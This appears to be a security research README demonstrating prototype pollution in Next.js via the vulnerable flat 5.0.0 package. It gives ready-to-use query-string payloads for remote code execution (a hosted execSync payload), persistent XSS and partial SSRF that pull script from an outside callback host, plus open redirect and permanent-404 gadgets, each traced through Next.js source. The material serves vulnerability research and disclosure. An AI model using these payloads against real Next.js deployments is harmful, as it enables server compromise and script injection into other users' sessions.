# Next.js Flat Prototype Pollution

A prototype pollution scenario in [Next.js](https://github.com/vercel/next.js/) when [flat](https://security.snyk.io/vuln/SNYK-JS-FLAT-596927) `5.0.0` is used.

> Video goes here

## Setup Instructions

Install dependencies and start production server.

```sh
npm install
npm run build
npm start
```

## Gadgets

> Lot of unexplored surface. If you find any gadgets, send a pull request :)

| Name                          | Description                                        | Type                          | Package                         | Completed |
| ----------------------------- | -------------------------------------------------- | ----------------------------- | ------------------------------- | :-------: |
| [AMP RCE](#amp-rce)           | via `validator` in `Validator`                     | Remote Code Execution         | `amp-validator`                 |     ✔     |
| [AMP XSS](#amp-xss)           | via `ampUrlPrefix` in `ampOptimizer.transformHtml` | Persistent XSS + Partial SSRF | `@ampproject/toolbox-optimizer` |     ✔     |
| [Redirect SSR](#redirect-ssr) | via `redirect.destination` in `getServerSideProps` | Open Redirect                 | `next`                          |     ✔     |
| [404 SSR](#404-ssr)           | via `notFound` in `getServerSideProps`             | Permanant 404                 | `next`                          |     ✔     |
| More AMP                      |                                                    |                               |                                 |           |
| React Server Components       |                                                    |                               |                                 |           |
| Image & Font Optimization     |                                                    |                               |                                 |           |
| API & Middlewares             |                                                    |                               |                                 |           |
| Router                        |                                                    |                               |                                 |           |
| Prisma                        |                                                    |                               |                                 |           |

## AMP RCE

> Only on `dev` server

```sh
# Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.validator=https://xss-callback.pwnfunction.repl.co/
```

## AMP XSS

Persistent Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml`.

Also a partial SSRF via `node-fetch` during AMP transform.

**Poc**

```sh
# XSS on a AMP enabled Page
/vulnerable?__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/

# XSS on a Non-AMP Page (but AMP should be enabled in atleast one other page on the site)
/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/

# Partial SSRF - works if route `/*` does not return 404 else server hangs
/vulnerable?__proto__.ampUrlPrefix=https://URL/

```

**Cause**

Requires 2 stages to poison the server-side code with our payload because AMP check happens before the pollution in `getServerSideProps`. So we pollute in the first request and trigger in another which does a new AMP check and optimize.
Once it's poisoned any single subsequent request will trigger XSS on any session as the server-side code is poisoned via prototype pollution.

```js
/* next/server/render.tsx */
const ampState = {
  ampFirst: pageConfig.amp === true,
  hasQuery: Boolean(query.amp),
  hybrid: pageConfig.amp === "hybrid",
};
const inAmpMode = !process.browser && (0, _amp).isInAmpMode(ampState); // isInAmpMode(ampState) { return ampState.ampFirst || ampState.hybrid && ampState.hasQuery }
// ...
html = await optimizeAmp(html, renderOpts.ampOptimizerConfig);
```

```js
/* next/server/optimize-amp.ts */
const optimizer = AmpOptimizer.create(config);
return optimizer.transformHtml(html, config); // config.ampUrlPrefix = 'https://xss-callback.pwnfunction.repl.co/'
```

```js
/* @ampproject/toolbox-optimizer/index.js */
async transformHtml(t, e) {
    const r = await i.parse(t);
    await this.transformTree(r, e);
    return i.serialize(r);
}
```

```js
/* `transformTree` eventually leads to the following */
5690: (t, e, r) => {
    // ...
    class RewriteAmpUrls {
        // ...
        transform(t, e) {
            // ...
            d.push(this._createPreload(l.attribs.src, "script")); // l.attribs.src = 'https://xss-callback.pwnfunction.repl.co/'
            // ...
        }
        // ...
    }
    t.exports = RewriteAmpUrls;
},

// <script async="" src="https://xss-callback.pwnfunction.repl.co/v0.js"></script>
```

> ➕ Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.

> 📝 Note: In `next.config.js`, we skip validation `skipValidation: true`.
> This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)

```js
// next.config.js
module.exports = {
  reactStrictMode: true,
  experimental: {
    amp: {
      optimizer: {},
      skipValidation: true,
    },
  },
};
```

## Redirect SSR

**Poc**

```url
/vulnerable?__proto__.redirect.destination=https://pwnfunction.com
```

**Cause**

```js
/* next/server/render.tsx */
if ("redirect" in data && typeof data.redirect === "object") {
  checkRedirectValues(data.redirect, req, "getServerSideProps");
  data.props = {
    __N_REDIRECT: data.redirect.destination,
    __N_REDIRECT_STATUS: (0, _loadCustomRoutes).getRedirectStatus(
      data.redirect
    ),
  };
  if (typeof data.redirect.basePath !== "undefined") {
    data.props.__N_REDIRECT_BASE_PATH = data.redirect.basePath;
  }
  renderOpts.isRedirect = true;
}
```

## 404 SSR

**Poc**

```url
/vulnerable?__proto__.notFound=1
```

**Cause**

```js
/* next/server/render.tsx */
if ('notFound' in data && data.notFound) {
    if (pathname === '/404') {
        throw new Error(
            `The /404 page can not return notFound in "getStaticProps", please remove it to continue!`
        )
    }

    ;(renderOpts as any).isNotFound = true
    return null
}
```

# Resources

- Prototype pollution attacks in NodeJS applications by Oliver Arteau
  - Video: [Prototype pollution attacks in NodeJS applications](https://www.youtube.com/watch?v=LUsiFV3dsK8)
  - Github: [Paper, Slides and Code](https://github.com/HoLyVieR/prototype-pollution-nsec18)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution) by [Black2Fan](https://twitter.com/Black2Fan)
- A tale of making internet pollution free
  - Slides: [A tale of making internet pollution free](https://speakerdeck.com/s1r1us/a-tale-of-making-internet-pollution-free-bsides-ahmedabad-2021) by [s1r1us](https://twitter.com/S1r1u5_) and [Harsh Jaiswal](https://twitter.com/rootxharsh)
  - Blog post: ["A tale of making internet pollution free" - Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)
- [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) by [Michał Bentkowski](https://twitter.com/SecurityMB)
- Javascript prototype pollution by [Rahul Maini](https://twitter.com/iamnoooob) and [Harsh Jaiswal](https://twitter.com/rootxharsh)
  - Video: [Part 1](https://www.youtube.com/watch?v=J3MIOIqvV8w)
  - Video: [Part 2](https://www.youtube.com/watch?v=yDmOXhr8wmw)
